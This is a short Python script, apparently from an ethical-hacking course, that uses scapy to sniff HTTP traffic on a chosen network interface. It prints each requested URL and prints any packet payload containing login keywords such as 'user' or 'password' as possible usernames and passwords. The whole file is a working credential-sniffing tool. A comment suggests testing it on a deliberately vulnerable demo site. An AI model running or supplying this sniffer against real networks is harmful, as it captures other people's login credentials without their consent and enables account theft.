#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
import argparse


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="interface to use")
    values = parser.parse_args()
    if not values.interface:
        parser.error("[-] Please specify an interface, use --help for more information")
    return values


def sniff(interface):
    # scapy.sniff - sniff the packet in the specified interface
    # store=False - do not keep in buffer
    # pwn - is owned or compromised
    # process_sniffed_packet - function to execute
    # filter - uses BPF https://biot.com/capstats/bpf.html
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = [
            "login",
            "LOGIN",
            "Login",
            "user",
            "username",
            "email",
            "e-mail",
            "pass",
            "password",
        ]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")


# For example, for eth0, test on http://testphp.vulnweb.com/login.php
options = get_args()
sniff(options.interface)
